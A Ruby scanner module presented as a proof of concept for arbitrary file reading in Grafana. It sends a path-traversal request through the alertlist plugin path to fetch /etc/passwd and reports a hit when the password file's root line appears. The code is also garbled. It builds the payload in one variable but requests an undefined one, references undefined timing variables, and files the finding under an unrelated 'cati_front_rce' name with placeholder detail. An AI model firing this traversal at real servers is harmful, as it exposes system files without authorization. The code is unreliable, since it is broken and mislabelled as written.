class RBModule_grafana_arb_read
    def initialize
    end
    def metadata
        info = { "name" => "grafana_arb_read", 
            "description" => "Poc for grafana arbitray read file" }
        return info
    end

    def scan(uri)
        scheme = uri.scheme
        if scheme == nil 
            error("Scheme is none #{uri}")
            return 
        end
        payload_url = scheme + "://" + "#{uri.host}:#{uri.port}" + "/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd"

        info("Send url:#{url}")
        resp = Request.get(url, headers={"host"=>uri.host,"Connection"=>"close"})
        info("Cati cost time: #{after - before} ms, vulntest")
        if resp.body.include?("root:x:0") 
            issue = {
                "name"=> "cati_front_rce",
                "level" => "highrisk",
                "confidence" => "confirm",
                "detail" => "this is a detail",
                "host" => "#{uri.host}:#{uri.port}",
                "response" => resp.orig_resp
            }

            IssueReporter.add_issue(issue)
        end
    end

    def passive_run(index)
        log = HistoryLog.get_req index
        url = log.url
        uri = UriParser.parse(url)
        info("Test url: #{uri}")
        scan(uri)
        #scan("http://127.0.0.1:8009")
    end
    def active_run(url, opts)
        uri = UriParser.parse(url)
        info("Test url: #{uri}")
        scan(uri)
    end
end